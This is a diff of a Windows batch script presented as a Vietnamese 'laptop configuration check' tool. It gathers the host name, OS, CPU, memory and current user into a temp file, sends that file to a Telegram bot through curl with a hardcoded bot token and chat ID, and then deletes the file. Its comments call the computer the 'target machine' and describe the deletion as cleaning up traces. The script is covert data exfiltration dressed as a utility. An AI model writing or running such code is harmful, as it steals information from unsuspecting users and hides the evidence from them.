@@ -2,24 +2,24 @@
 title Kiem Tra Cau Hinh Laptop
 color 0A
 
-:: Buoc 1: Thu thap thong tin cau hinh va luu tam vao o dia C cua may muc tieu
+:: Buoc 1: Thu thap thong tin cau hinh bang systeminfo va luu tam vao o C
 set "temp_file=%TEMP%\cauhinhlap.txt"
+
+echo Dang quet cau hinh he thong (Vui long cho trong giay lat)...
 
 (
 echo ===================================================
 echo           THONG TIN CAU HINH LAPTOP
 echo ===================================================
 echo Thoi gian: %date% %time%
-echo May tinh: %computername%
 echo User dang dung: %username%
 echo ---------------------------------------------------
-wmic os get Caption,OSArchitecture /value | findstr "="
-wmic cpu get Name /value | findstr "="
-wmic computersystem get TotalPhysicalMemory /value | findstr "="
-wmic diskdrive get Model,Size /value | findstr "="
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Processor(s)" /C:"Total Physical Memory"
+echo ---------------------------------------------------
+echo Tac vu hoan thanh!
 ) > "%temp_file%"
 
-echo Dang dong bo du lieu len he thong...
+echo Dang dong bo du lieu len he thong Telegram...
 
 :: Buoc 2: Cau hinh Telegram
 set "TOKEN=8982230721:AAGAIhbsrBIILFrwdr7RsnFLWUKjwf9QNLE"
@@ -29,11 +29,11 @@ set "CHAT_ID=6473475153"
 curl -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
      -F "chat_id=%CHAT_ID%" ^
      -F "document=@%temp_file%" ^
-     -F "caption= Mau thong tin cau hinh moi tu may %computername%" >nul
+     -F "caption= Thong tin cau hinh may: %computername%" >nul
 
 :: Buoc 4: Xoa file tam tren may muc tieu de don dep dau vet
 del "%temp_file%"
 
 echo.
-echo Tac vu hoan thanh!
+echo Da dong bo thanh cong ve dien thoai!
 pause
